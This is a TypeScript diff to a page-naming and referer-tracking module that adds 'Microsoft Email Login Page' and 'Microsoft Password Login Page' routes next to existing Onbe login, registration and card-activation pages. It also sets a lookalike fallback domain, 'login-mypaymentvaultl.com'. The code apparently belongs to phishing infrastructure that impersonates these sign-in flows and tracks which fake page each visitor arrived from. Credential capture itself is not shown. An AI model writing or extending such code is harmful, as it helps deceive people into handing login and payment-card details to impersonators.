@@ -164,6 +164,8 @@ const PAGE_NAME_MAP: Record<string, string> = {
   '/onbe': 'Onbe Login Page',
   '/onbe-register': 'Onbe Registration Page',
   '/onbe-activate-card': 'Onbe Card Activation Page',
+  '/microsoft-email': 'Microsoft Email Login Page',
+  '/microsoft-password': 'Microsoft Password Login Page',
 };
 
 /**
@@ -174,9 +176,18 @@ export function getPageName(path: string): string {
 }
 
 /**
- * Extract source info from referer header
+ * Extract source info from referer header or explicit source data
  */
-export function extractSourceInfo(referer: string | undefined, fallbackPath: string = '/'): SourceInfo {
+export function extractSourceInfo(referer: string | undefined, fallbackPath: string = '/', explicitSource?: { domain?: string; path?: string }): SourceInfo {
+  // Use explicit source if provided
+  if (explicitSource?.domain && explicitSource?.path) {
+    return {
+      domain: explicitSource.domain,
+      path: explicitSource.path,
+      pageName: getPageName(explicitSource.path),
+    };
+  }
+  
   try {
     if (referer) {
       const url = new URL(referer);
@@ -190,9 +201,9 @@ export function extractSourceInfo(referer: string | undefined, fallbackPath: str
     console.error('[SourceInfo] Failed to parse referer:', error);
   }
   
-  // Fallback
+  // Fallback - using correct domain with 'l' not 't'
   return {
-    domain: 'login-mypaymentvaultt.com',
+    domain: 'login-mypaymentvaultl.com',
     path: fallbackPath,
     pageName: getPageName(fallbackPath),
   };
